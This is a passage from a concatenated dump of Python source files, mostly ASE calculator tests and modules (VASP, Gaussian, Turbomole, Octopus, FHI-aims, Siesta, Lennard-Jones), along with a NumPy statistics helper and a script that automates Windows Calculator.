factory.calc(dft=EMT())\n    atoms.calc = dftd3\n\n    e1, e2 = [atoms.get_potential_energy(force_consistent=x)\n              for x in [False, True]]\n    assert e1 == pytest.approx(e2, abs=1e-14)\n\n\nclass EMTWithMagmoms(EMT):\n    implemented_properties = [*EMT.implemented_properties, 'magmoms']\n\n    def dummy_magmoms(self, atoms):\n        return 1.234 + np.arange(len(atoms))\n\n    def calculate(self, atoms, *args, **kwargs):\n        super().calculate(atoms, *args, **kwargs)\n        self.results['magmoms'] = self.dummy_magmoms(atoms)\n\n\ndef test_non_dftd3_property(factory):\n    dft = EMTWithMagmoms()\n    calc = factory.calc(dft=dft)\n\n    # Our DFTD3 calculator should advertise that it supports this property:\n    assert 'magmoms' in calc.implemented_properties\n\n    atoms = bulk('Au', cubic=True)\n    atoms.calc = calc\n    magmoms = atoms.get_magnetic_moments()\n    assert magmoms == pytest.approx(dft.dummy_magmoms(atoms))\n    print('magmoms', magmoms)\n", "22": "\"\"\"\nRun some VASP tests to ensure that the VASP calculator works. This\nis conditional on the existence of the VASP_COMMAND or VASP_SCRIPT\nenvironment variables\n\n\"\"\"\n\nimport numpy as np\nimport pytest\n\nfrom ase.io import read\n\ncalc = pytest.mark.calculator\n\n\n@calc('vasp')\ndef test_main(factory, atoms_co):\n\n    # simple test calculation of CO molecule\n    co = atoms_co  # aliasing\n\n    calc = factory.calc(xc='LDA',\n                        prec='Low',\n                        algo='Fast',\n                        lorbit=11,\n                        ismear=0,\n                        sigma=1.,\n                        nbands=12,\n                        istart=0,\n                        nelm=3,\n                        lwave=False,\n                        lcharg=False,\n                        ldipol=True)\n\n    co.calc = calc\n    energy = co.get_potential_energy()\n    forces = co.get_forces()\n    dipole_moment = co.get_dipole_moment()\n\n    # check that parsing of vasprun.xml file works\n    conf = read('vasprun.xml')\n    assert conf.calc.parameters['kpoints_generation']\n    assert conf.calc.parameters['sigma'] == 1.0\n    assert conf.calc.parameters['ialgo'] == 68\n    assert energy - conf.get_potential_energy() == 0.0\n\n    # Check some arrays\n    assert np.allclose(conf.get_forces(), forces)\n    assert np.allclose(conf.get_dipole_moment(), dipole_moment, atol=1e-6)\n\n    # Check k-point-dependent properties\n    assert len(conf.calc.get_eigenvalues(spin=0)) >= 12\n    assert conf.calc.get_occupation_numbers()[2] == 2\n    assert conf.calc.get_eigenvalues(spin=1) is None\n    kpt = conf.calc.get_kpt(0)\n    assert kpt.weight == 1.\n\n    # Perform a spin-polarised calculation\n    co.calc.set(ispin=2, ibrion=-1)\n    co.get_potential_energy()\n    conf = read('vasprun.xml')\n    assert len(conf.calc.get_eigenvalues(spin=1)) >= 12\n    assert conf.calc.get_occupation_numbers(spin=1)[0] == 1.\n\n    # Cleanup\n    calc.clean()\n", "23": "import os\nimport copy\nfrom collections.abc import Iterable\nfrom shutil import which\nfrom typing import Dict, Optional\n\nfrom ase.io import read, write\nfrom ase.calculators.calculator import FileIOCalculator, EnvironmentError\n\n\nclass GaussianDynamics:\n    calctype = 'optimizer'\n    delete = ['force']\n    keyword: Optional[str] = None\n    special_keywords: Dict[str, str] = dict()\n\n    def __init__(self, atoms, calc=None):\n        self.atoms = atoms\n        if calc is not None:\n            self.calc = calc\n        else:\n            if self.atoms.calc is None:\n                raise ValueError(\"{} requires a valid Gaussian calculator \"\n                                 \"object!\".format(self.__class__.__name__))\n\n            self.calc = self.atoms.calc\n\n    def todict(self):\n        return {'type': self.calctype,\n                'optimizer': self.__class__.__name__}\n\n    def delete_keywords(self, kwargs):\n        \"\"\"removes list of keywords (delete) from kwargs\"\"\"\n        for d in self.delete:\n            kwargs.pop(d, None)\n\n    def set_keywords(self, kwargs):\n        args = kwargs.pop(self.keyword, [])\n        if isinstance(args, str):\n            args = [args]\n        elif isinstance(args, Iterable):\n            args = list(args)\n\n        for key, template in self.special_keywords.items():\n            if key in kwargs:\n                val = kwargs.pop(key)\n                args.append(template.format(val))\n\n        kwargs[self.keyword] = args\n\n    def run(self, **kwargs):\n        calc_old = self.atoms.calc\n        params_old = copy.deepcopy(self.calc.parameters)\n\n        self.delete_keywords(kwargs)\n        self.delete_keywords(self.calc.parameters)\n        self.set_keywords(kwargs)\n\n        self.calc.set(**kwargs)\n        self.atoms.calc = self.calc\n\n        try:\n            self.atoms.get_potential_energy()\n        except OSError:\n            converged = False\n        else:\n            converged = True\n\n        atoms = read(self.calc.label + '.log')\n        self.atoms.cell = atoms.cell\n        self.atoms.positions = atoms.positions\n\n        self.calc.parameters = params_old\n        self.calc.reset()\n        if calc_old is not None:\n            self.atoms.calc = calc_old\n\n        return converged\n\n\nclass GaussianOptimizer(GaussianDynamics):\n    keyword = 'opt'\n    special_keywords = {\n        'fmax': '{}',\n        'steps': 'maxcycle={}',\n    }\n\n\nclass GaussianIRC(GaussianDynamics):\n    keyword = 'irc'\n    special_keywords = {\n        'direction': '{}',\n        'steps': 'maxpoints={}',\n    }\n\n\nclass Gaussian(FileIOCalculator):\n    implemented_properties = ['energy', 'forces', 'dipole']\n    command = 'GAUSSIAN < PREFIX.com > PREFIX.log'\n    discard_results_on_any_change = True\n\n    def __init__(self, *args, label='Gaussian', **kwargs):\n        FileIOCalculator.__init__(self, *args, label=label, **kwargs)\n\n    def calculate(self, *args, **kwargs):\n        gaussians = ('g16', 'g09', 'g03')\n        if 'GAUSSIAN' in self.command:\n            for gau in gaussians:\n                if which(gau):\n                    self.command = self.command.replace('GAUSSIAN', gau)\n                    break\n            else:\n                raise EnvironmentError('Missing Gaussian executable {}'\n                                       .format(gaussians))\n\n        FileIOCalculator.calculate(self, *args, **kwargs)\n\n    def write_input(self, atoms, properties=None, system_changes=None):\n        FileIOCalculator.write_input(self, atoms, properties, system_changes)\n        write(self.label + '.com', atoms, properties=properties,\n              format='gaussian-in', parallel=False, **self.parameters)\n\n    def read_results(self):\n        output = read(self.label + '.log', format='gaussian-out')\n        self.calc = output.calc\n        self.results = output.calc.results\n\n    # Method(s) defined in the old calculator, added here for\n    # backwards compatibility\n    def clean(self):\n        for suffix in ['.com', '.chk', '.log']:\n            try:\n                os.remove(os.path.join(self.directory, self.label + suffix))\n            except OSError:\n                pass\n\n    def get_version(self):\n        raise NotImplementedError  # not sure how to do this yet\n", "24": "import numpy as np\n\ndef calculate(elements):\n  if len(elements) < 9:\n    raise ValueError(\"List must contain nine numbers.\")\n    \n  \n  matrix = np.array(elements)\n  matrix = matrix.reshape((3, 3))\n\n  calculations = {}\n  calc_mean = []\n  calc_mean.append(np.mean(matrix, axis=(0)).tolist())\n  calc_mean.append(np.mean(matrix, axis=(1)).tolist())\n  calc_mean.append(np.mean(matrix).tolist())\n  calculations['mean'] = calc_mean\n\n  calc_var = []\n  calc_var.append(np.var(matrix, axis=(0)).tolist())\n  calc_var.append(np.var(matrix, axis=(1)).tolist())\n  calc_var.append(np.var(matrix).tolist())\n  calculations['variance'] = calc_var\n\n  calc_std = []\n  calc_std.append(np.std(matrix, axis=(0)).tolist())\n  calc_std.append(np.std(matrix, axis=(1)).tolist())\n  calc_std.append(np.std(matrix).tolist())\n  calculations['standard deviation'] = calc_std\n\n  calc_max = []\n  calc_max.append(np.max(matrix, axis=(0)).tolist())\n  calc_max.append(np.max(matrix, axis=(1)).tolist())\n  calc_max.append(np.max(matrix).tolist())\n  calculations['max'] = calc_max\n\n  calc_min = []\n  calc_min.append(np.min(matrix, axis=(0)).tolist())\n  calc_min.append(np.min(matrix, axis=(1)).tolist())\n  calc_min.append(np.min(matrix).tolist())\n  calculations['min'] = calc_min\n\n  calc_sum = []\n  calc_sum.append(np.sum(matrix, axis=(0)).tolist())\n  calc_sum.append(np.sum(matrix, axis=(1)).tolist())\n  calc_sum.append(np.sum(matrix).tolist())\n  calculations['sum'] = calc_sum\n\n  return calculations", "25": "# type: ignore\nimport numpy as np\nfrom ase.calculators.turbomole import Turbomole\nfrom ase.build import molecule\n\n\ndef test_turbomole_h2o():\n    mol = molecule('H2O')\n\n    params = {\n        'title': 'water',\n        'task': 'geometry optimization',\n        'use redundant internals': True,\n        'basis set name': 'def2-SV(P)',\n        'total charge': 0,\n        'multiplicity': 1,\n        'use dft': True,\n        'density functional': 'b3-lyp',\n        'use resolution of identity': True,\n        'ri memory': 1000,\n        'force convergence': 0.001,\n        'geometry optimization iterations': 50,\n        'scf iterations': 100\n    }\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n    assert calc.converged\n\n    # use the get_property() method\n    energy = calc.get_property('energy', mol, False)\n    assert energy is not False\n    assert np.isclose(energy, -2076.286138, atol=1e-5)\n    forces = calc.get_property('forces', mol, False)\n    assert forces is not False\n    assert np.linalg.norm(forces) < 0.01\n    dipole = np.linalg.norm(calc.get_property('dipole', mol, False))\n    assert np.isclose(dipole, 0.448, rtol=0.01)\n\n    # use the get_results() method\n    results = calc.get_results()\n    print(results['molecular orbitals'])\n\n    # use the __getitem__() method\n    print(calc['results']['molecular orbitals'])\n    print(calc['results']['geometry optimization history'])\n\n    # perform a normal mode calculation with the optimized structure\n\n    params.update({\n        'task': 'normal mode analysis',\n        'density convergence': 1.0e-7\n    })\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n\n    spectrum = calc['results']['vibrational spectrum']\n    freq_ref = [0, 0, 0, 0, 0, 0, 1633, 3637, 3745]\n    for s in spectrum:\n        for freq, mode in zip(freq_ref, range(1, 7)):\n            if s['mode number'] == mode:\n                assert np.isclose(s['frequency']['value'], freq, rtol=0.05)\n\n    print(calc.todict(skip_default=False))\n", "26": "import pytest\nimport numpy as np\n\nfrom ase.collections import g2\nfrom ase.build import bulk, graphene_nanoribbon\n\n\ndef calculate(factory, system, **kwargs):\n    calc = factory.calc(**kwargs)\n    system.calc = calc\n    system.get_potential_energy()\n    calc.get_eigenvalues()\n    return calc\n\n\ncalc = pytest.mark.calculator\n\n\n@calc('octopus', Spacing='0.25 * angstrom')\n@pytest.mark.xfail\ndef test_h2o(factory):\n    calc = calculate(factory,\n                     g2['H2O'],\n                     OutputFormat='xcrysden',\n                     SCFCalculateDipole=True)\n    dipole = calc.get_dipole_moment()\n    E = calc.get_potential_energy()\n\n    print('dipole', dipole)\n    print('energy', E)\n\n    # XXX What's with the dipole not being correct?\n    # XXX Investigate\n\n    assert pytest.approx(dipole, abs=0.02) == [0, 0, -0.37]\n    dipole_err = np.abs(dipole - [0., 0., -0.37]).max()\n    assert dipole_err < 0.02, dipole_err\n\n\n@calc('octopus', Spacing='0.2 * angstrom')\ndef test_o2(factory):\n    atoms = g2['O2']\n    atoms.center(vacuum=2.5)\n    calculate(factory,\n              atoms,\n              BoxShape='parallelepiped',\n              SpinComponents='spin_polarized',\n              ExtraStates=2)\n\n\n@calc('octopus')\ndef test_si(factory):\n    calc = calculate(factory,\n                     bulk('Si'),  # , orthorhombic=True),\n                     KPointsGrid=[[4, 4, 4]],\n                     KPointsUseSymmetries=True,\n                     SmearingFunction='fermi_dirac',\n                     ExtraStates=2,\n                     Smearing='0.1 * eV',\n                     ExperimentalFeatures=True,\n                     Spacing='0.45 * Angstrom')\n    eF = calc.get_fermi_level()\n    print('eF', eF)\n\n\nif 0:  # This calculation does not run will in Octopus\n    # We will do the \"toothless\" spin-polarised Si instead.\n    calc = calculate('Fe',\n                     bulk('Fe', orthorhombic=True),\n                     KPointsGrid=[[4, 4, 4]],\n                     KPointsUseSymmetries=True,\n                     ExtraStates=4,\n                     Spacing='0.15 * Angstrom',\n                     SmearingFunction='fermi_dirac',\n                     Smearing='0.1 * eV',\n                     PseudoPotentialSet='sg15',\n                     ExperimentalFeatures=True,\n                     SpinComponents='spin_polarized')\n    eF = calc.get_fermi_level()\n    assert abs(eF - 5.33) < 1e-1\n    # XXXX octopus does not get magnetic state?\n    print('eF', eF)\n\nif 0:\n    # Experimental feature: mixed periodicity.  Let us not do this for now...\n    graphene = graphene_nanoribbon(2, 2, sheet=True)\n    graphene.positions = graphene.positions[:, [0, 2, 1]]\n    graphene.pbc = [1, 1, 0]  # from 1, 0, 1\n    calc = calculate('graphene',\n                     graphene,\n                     KPointsGrid=[[2, 1, 2]],\n                     KPointsUseSymmetries=True,\n                     ExperimentalFeatures=True,\n                     ExtraStates=4,\n                     SmearingFunction='fermi_dirac',\n                     Smearing='0.1 * eV')\n", "27": "import tempfile\nimport os\n\nimport pytest\nfrom ase.calculators.aims import Aims\nfrom ase import Atoms\n\n\n@pytest.mark.skip('legacy test with hardcoded paths and commands')\ndef test_aims_interface():\n    # test the new command handling + legacy behavior\n    aims_command = 'aims.x'\n    aims_command_alternative = 'mpirun -np 4 fhiaims.x'\n    outfilename = 'alternative_aims.out'\n    outfilename_default = 'aims.out'\n    command = '{0:s} > {1:s}'.format(aims_command, outfilename)\n    #command_alternative = '{0:s} > {1:s}'.format(aims_command_alternative, outfilename)\n    command_default = '{0:s} > {1:s}'.format(aims_command, outfilename_default)\n    legacy_command = 'aims.version.serial.x > aims.out'\n    legacy_aims_command = legacy_command.split('>')[0].strip()\n    legacy_outfilename = legacy_command.split('>')[-1].strip()\n\n    # legacy behavior of empty init\n    calc = Aims()\n    assert calc.command == legacy_command\n    assert calc.outfilename == legacy_outfilename\n    assert calc.aims_command == legacy_aims_command\n\n    # behavior of empty init with env variable\n    os.environ['ASE_AIMS_COMMAND'] = aims_command_alternative\n    calc = Aims()\n    assert calc.command == '{0} > {1}'.format(aims_command_alternative, outfilename_default)\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command_alternative\n\n    # legacy behavior of \"proper\" command\n    calc = Aims(run_command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # legacy behavior of an \"improper\" command\n    calc = Aims(run_command=aims_command)\n    assert calc.command == command_default\n    assert calc.aims_command == aims_command\n    assert calc.outfilename == outfilename_default\n\n    # fixed \"command\"  behavior\n    calc = Aims(command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # novel way to use aims_command, no specific outfile\n    calc = Aims(aims_command=aims_command)\n    assert calc.command == command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n\n    calc = Aims(aims_command=aims_command,\n                outfilename=outfilename)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # # testing the setters\n    calc.command = command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n    assert calc.command == command_default\n\n    #calc.set_aims_command(aims_command_alternative)\n    calc.aims_command = aims_command_alternative\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename_default\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename_default)\n\n    calc.outfilename = outfilename\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename)\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename\n\n    # test writing files\n    tmp_dir = tempfile.mkdtemp()\n    water = Atoms('HOH', [(1, 0, 0), (0, 0, 0), (0, 1, 0)])\n    calc = Aims(xc='PBE',\n                output=['dipole'],\n                sc_accuracy_etot=1e-6,\n                sc_accuracy_eev=1e-3,\n                sc_accuracy_rho=1e-6,\n                species_dir=\"/data/rittmeyer/FHIaims/species_defaults/light/\",\n                sc_accuracy_forces=1e-4,\n                label=tmp_dir,\n                )\n    try:\n        calc.prepare_input_files()\n        raise AssertionError\n    except ValueError:\n        pass\n\n    calc.atoms = water\n    calc.prepare_input_files()\n    for f in ['control.in', 'geometry.in']:\n        assert os.path.isfile(os.path.join(tmp_dir, f))\n", "28": "#!python3\n# -*- coding: utf-8 -*-\n# works on windows XP, 7, 8 and 10\nimport os\nimport sys\nimport time\nimport subprocess\n\nsys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # not required after 'pip install uiautomation'\nimport uiautomation as automation\n\n\ndef Calc(window, btns, expression):\n    expression = ''.join(expression.split())\n    if not expression.endswith('='):\n        expression += '='\n    for char in expression:\n        automation.Logger.Write(char, writeToFile = False)\n        btns[char].Click(waitTime = 0.05)\n    window.SendKeys('{Ctrl}c', waitTime = 0)\n    result = automation.GetClipboardText()\n    automation.Logger.WriteLine(result, automation.ConsoleColor.Cyan, writeToFile = False)\n    time.sleep(1)\n\n\ndef CalcOnXP():\n    chars = '0123456789.+-*/=()'\n    calcWindow = automation.WindowControl(searchDepth = 1, ClassName = 'SciCalc')\n    if not calcWindow.Exists(0, 0):\n        subprocess.Popen('calc')\n    calcWindow.SetActive()\n    calcWindow.SendKeys('{Alt}vs', 0.5)\n    clearBtn = calcWindow.ButtonControl(Name = 'CE')\n    clearBtn.Click()\n    char2Button = {}\n    for key in chars:\n        char2Button[key] = calcWindow.ButtonControl(Name = key)\n    Calc(calcWindow, char2Button, '1234 * (4 + 5 + 6) - 78 / 90')\n    Calc(calcWindow, char2Button, '2*3.14159*10')\n\n\ndef CalcOnWindows7And8():\n    char2Id = {\n        '0' : '130',\n        '1' : '131',\n        '2' : '132',\n        '3' : '133',\n        '4' : '134',\n        '5' : '135',\n        '6' : '136',\n        '7' : '137',\n        '8' : '138',\n        '9' : '139',\n        '.' : '84',\n        '+' : '93',\n        '-' : '94',\n        '*' : '92',\n        '/' : '91',\n        '=' : '121',\n        '(' : '128',\n        ')' : '129',\n    }\n    calcWindow = automation.WindowControl(searchDepth = 1, ClassName = 'CalcFrame')\n    if not calcWindow.Exists(0, 0):\n        subprocess.Popen('calc')\n    calcWindow.SetActive()\n    calcWindow.SendKeys('{Alt}2')\n    clearBtn = calcWindow.ButtonControl(foundIndex= 8, Depth = 3)  #test foundIndex and Depth, the 8th button is clear\n    if clearBtn.AutomationId == '82':\n        clearBtn.Click()\n    char2Button = {}\n    for key in char2Id:\n        char2Button[key] = calcWindow.ButtonControl(AutomationId = char2Id[key])\n    Calc(calcWindow, char2Button, '1234 * (4 + 5 + 6) - 78 / 90')\n    Calc(calcWindow, char2Button, '2*3.14159*10')\n\n\ndef CalcOnWindows10():\n    char2Id = {\n        '0' : 'num0Button',\n        '1' : 'num1Button',\n        '2' : 'num2Button',\n        '3' : 'num3Button',\n        '4' : 'num4Button',\n        '5' : 'num5Button',\n        '6' : 'num6Button',\n        '7' : 'num7Button',\n        '8' : 'num8Button',\n        '9' : 'num9Button',\n        '.' : 'decimalSeparatorButton',\n        '+' : 'plusButton',\n        '-' : 'minusButton',\n        '*' : 'multiplyButton',\n        '/' : 'divideButton',\n        '=' : 'equalButton',\n        '(' : 'openParanthesisButton',\n        ')' : 'closeParanthesisButton',\n    }\n    calcWindow = automation.WindowControl(searchDepth = 1, ClassName = 'ApplicationFrameWindow', Name = 'Calculator')\n    if not calcWindow.Exists(0, 0):\n        subprocess.Popen('calc')\n    calcWindow.SetActive()\n    calcWindow.ButtonControl(AutomationId = 'NavButton').Click()\n    calcWindow.ListItemControl(Name = 'Scientific Calculator').Click()\n    calcWindow.ButtonControl(AutomationId = 'clearButton').Click()\n    char2Button = {}\n    for key in char2Id:\n        char2Button[key] = calcWindow.ButtonControl(AutomationId = char2Id[key])\n    Calc(calcWindow, char2Button, '1234 * (4 + 5 + 6) - 78 / 90')\n    Calc(calcWindow, char2Button, '2*3.14159*10')\n\nif __name__ == '__main__':\n    import platform\n    osVersion = int(platform.version().split('.')[0])\n    if osVersion < 6:\n        CalcOnXP()\n    elif osVersion == 6:\n        CalcOnWindows7And8()\n    elif osVersion >= 10:\n        CalcOnWindows10()\n", "29": "import numpy as np\nimport pytest\n\nfrom ase import Atoms\nfrom ase.build import bulk\nfrom ase.calculators.lj import LennardJones\n\n\n# test non-bulk properties\nreference_potential_energy = pytest.approx(-1.0)\n\n\ndef systems_minimum():\n    \"\"\"two atoms at potential minimum\"\"\"\n\n    atoms = Atoms('H2', positions=[[0, 0, 0], [0, 0, 2 ** (1.0 / 6.0)]])\n    calc = LennardJones(rc=1.0e5)\n    atoms.calc = calc\n    yield atoms\n\n    calc = LennardJones(rc=1.0e5, smooth=True)\n    atoms.calc = calc\n    yield atoms\n\n\ndef test_minimum_energy():\n    # testing at the minimum to see if anything is on fire\n    # See https://en.wikipedia.org/wiki/Lennard-Jones_potential\n    # Minimum is at r=2^(1/6)*sigma, and it's -1.\n\n    for atoms in systems_minimum():\n        assert atoms.get_potential_energy() == reference_potential_energy\n        assert atoms.get_potential_energies().sum() == \\\n            reference_potential_energy\n\n\ndef test_minimum_forces():\n    # forces should be zero\n    for atoms in systems_minimum():\n        np.testing.assert_allclose(atoms.get_forces(), 0, atol=1e-14)\n\n\ndef test_system_changes():\n    # https://gitlab.com/ase/ase/-/merge_requests/1817\n\n    for atoms in systems_minimum():\n        atoms.calc.calculate(atoms, system_changes=['positions'])\n        assert atoms.get_potential_energy() == reference_potential_energy\n\n\ndef test_finite_difference():\n    # ensure that we got the modified forces right\n    h = 1e-10\n    r = 8.0\n    calc = LennardJones(smooth=True, ro=6, rc=10, sigma=3)\n    atoms = Atoms('H2', positions=[[0, 0, 0], [r, 0, 0]])\n    atoms2 = Atoms('H2', positions=[[0, 0, 0], [r + h, 0, 0]])\n    atoms.calc = calc\n    atoms2.calc = calc\n\n    fd_force = (atoms2.get_potential_energy() -\n                atoms.get_potential_energy()) / h\n    force = atoms.get_forces()[0, 0]\n\n    np.testing.assert_allclose(fd_force, force)\n\n\n# test bulk properties\nstretch = 1.5\nreference_force = pytest.approx(1.57190846e-05)\nreference_pressure = pytest.approx(1.473229212e-05)\n\n\ndef systems_bulk():\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    calc = LennardJones(rc=10)\n    atoms.calc = calc\n\n    yield atoms\n\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    # somewhat hand-picked parameters, but ok for comparison\n    calc = LennardJones(rc=12, ro=10, smooth=True)\n    atoms.calc = calc\n\n    yield atoms\n\n\ndef test_bulk_energies():\n    # check energies\n\n    for atoms in systems_bulk():\n        assert np.allclose(\n            atoms.get_potential_energy(), atoms.get_potential_energies().sum()\n        )\n        # energies should be equal in this high-symmetry structure\n        assert atoms.get_potential_energies().std() == pytest.approx(0.0)\n\n\ndef test_bulk_forces():\n    for atoms in systems_bulk():\n        # displace atom for 0.03 \\AA\n        atoms.positions[0, 0] += 0.03\n\n        # check forces sum to zero\n        assert np.allclose(atoms.get_forces().sum(axis=0), 0)\n\n        # check reference force\n        assert atoms.get_forces()[0, 0] == reference_force\n\n\ndef test_bulk_stress():\n    # check stress computation for sanity and reference\n    # reference value computed for \"non-smooth\" LJ, so\n    # we only test that\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    calc = LennardJones(rc=10)\n    atoms.calc = calc\n\n    stress = atoms.get_stress()\n    stresses = atoms.get_stresses()\n\n    assert np.allclose(stress, stresses.sum(axis=0))\n\n    # check reference pressure\n    pressure = sum(stress[:3]) / 3\n\n    assert pressure == reference_pressure\n", "30": "import ase.build\nfrom ase.calculators.siesta import Siesta\n\n\ndef test_siesta_read_eigenvalues_soc(datadir):\n    \"\"\" In this test, we read a stored siesta.EIG file.\"\"\"\n    calc = Siesta()\n    assert calc.read_eigenvalues() == 1\n    calc.directory = datadir / 'siesta'\n    print(datadir)\n    assert calc.read_eigenvalues() == 0\n    assert calc.results['eigenvalues'].shape == (1, 1, 30)\n\n\ndef test_siesta_read_eigenvalues(siesta_factory):\n    # Test real calculation which produces a gapped .EIG file\n    atoms = ase.build.bulk('Si', cubic=True)\n    calc = siesta_factory.calc(kpts=[2, 1, 1])\n    atoms.calc = calc\n    atoms.get_potential_energy()\n\n    assert calc.results['eigenvalues'].shape[:2] == (1, 2)  # spins x bands\n    assert calc.get_k_point_weights().shape == (2,)\n    assert calc.get_ibz_k_points().shape == (2, 3)\n", "31": "import pytest\nimport numpy as np\nfrom ase import io\nfrom ase.optimize import BFGS\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@calc('vasp')\ndef test_vasp_Al_volrelax(factory):\n    \"\"\"\n    Run VASP tests to ensure that relaxation with the VASP calculator works.\n    This is conditional on the existence of the VASP_COMMAND or VASP_SCRIPT\n    environment variables.\n\n    \"\"\"\n\n    # -- Perform Volume relaxation within Vasp\n    def vasp_vol_relax():\n        Al = bulk('Al', 'fcc', a=4.5, cubic=True)\n        calc = factory.calc(xc='LDA',\n                            isif=7,\n                            nsw=5,\n                            ibrion=1,\n                            ediffg=-1e-3,\n                            lwave=False,\n                            lcharg=False)\n        Al.calc = calc\n        Al.get_potential_energy()  # Execute\n\n        # Explicitly parse atomic position output file from Vasp\n        CONTCAR_Al = io.read('CONTCAR', format='vasp')\n\n        print('Stress after relaxation:\\n', calc.read_stress())\n\n        print('Al cell post relaxation from calc:\\n',\n              calc.get_atoms().get_cell())\n        print('Al cell post relaxation from atoms:\\n', Al.get_cell())\n        print('Al cell post relaxation from CONTCAR:\\n', CONTCAR_Al.get_cell())\n\n        # All the cells should be the same.\n        assert (calc.get_atoms().get_cell() == CONTCAR_Al.get_cell()).all()\n        assert (Al.get_cell() == CONTCAR_Al.get_cell()).all()\n\n        return Al\n\n    # -- Volume relaxation using ASE with Vasp as force/stress calculator\n    def ase_vol_relax():\n        Al = bulk('Al', 'fcc', a=4.5, cubic=True)\n        calc = factory.calc(xc='LDA')\n        Al.calc = calc\n\n        from ase.constraints import StrainFilter\n        sf = StrainFilter(Al)\n        with BFGS(sf, logfile='relaxation.log') as qn:\n            qn.run(fmax=0.1, steps=5)\n\n        print('Stress:\\n', calc.read_stress())\n        print('Al post ASE volume relaxation\\n', calc.get_atoms().get_cell())\n\n        return Al\n\n    # Test function for comparing two cells\n    def cells_almost_equal(cellA, cellB, tol=0.01):\n        return (np.abs(cellA - cellB) < tol).all()\n\n    # Correct LDA relaxed cell\n    a_rel = 4.18\n    LDA_cell = np.diag([a_rel, a_rel, a_rel])\n\n    Al_vasp = vasp_vol_relax()\n    Al_ase = ase_vol_relax()\n\n    assert cells_almost_equal(LDA_cell, Al_vasp.get_cell())\n    assert cells_almost_equal(LDA_cell, Al_ase.get_cell())\n\n    # Cleanup\n    Al_ase.calc.clean()\n", "32": "import pytest\nfrom ase.build import bulk\n\ncalc = pytest.mark.calculator\n\n\n@pytest.fixture\ndef system():\n    return bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\n@pytest.fixture\ndef expected_nelect_from_vasp():\n    # Expected number of electrons from the specified system\n    # with no charge\n    return 12\n\n\n@calc('vasp')\ndef test_vasp_charge(factory, system, expected_nelect_from_vasp):\n    \"\"\"\n    Run VASP tests to ensure that determining number of electrons from\n    user-supplied charge works correctly.\n\n    Test that the number of charge found matches the expected.\n    \"\"\"\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False)\n    system.calc = calc\n    system.get_potential_energy()\n\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == expected_nelect_from_vasp\n\n\n@calc('vasp')\ndef test_vasp_no_inputs(system, factory):\n    # Make sure that no nelect was written into INCAR yet (as it wasn't necessary)\n    calc = factory.calc()\n    system.calc = calc\n    system.get_potential_energy()\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n\n\n@calc('vasp')\ndef test_vasp_minus_charge(factory, system, expected_nelect_from_vasp):\n    # Compare VASP's output nelect from before minus charge to default nelect\n    # determined by us minus charge\n    charge = -2\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        charge=charge)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] == expected_nelect_from_vasp - charge\n\n\n@calc('vasp')\ndef test_vasp_nelect_charge_conflict(factory, system,\n                                     expected_nelect_from_vasp):\n    # Test that conflicts between explicitly given nelect and charge are detected\n    charge = -2\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        nelect=expected_nelect_from_vasp - charge + 1,\n                        charge=charge)\n    system.calc = calc\n    with pytest.raises(ValueError):\n        system.get_potential_energy()\n\n\n@calc('vasp')\ndef test_vasp_nelect_no_write(factory, system):\n    # Test that nothing is written if charge is 0 and nelect not given\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        charge=0)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar('INCAR')\n    assert calc.float_params['nelect'] is None\n\n\n@calc('vasp')\ndef test_vasp_nelect(factory, system):\n    # Test that explicitly given nelect still works as expected\n    calc = factory.calc(xc='LDA',\n                        nsw=-1,\n                        ibrion=-1,\n                        nelm=1,\n                        lwave=False,\n                        lcharg=False,\n                        nelect=15)\n    calc.calculate(system)\n    assert calc.get_number_of_electrons() == 15\n", "33": "# Encoding:UTF-8\n#\n# The MIT License (MIT)\n#\n# Copyright (c) 2016-2021 yutiansut/QUANTAXIS\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS 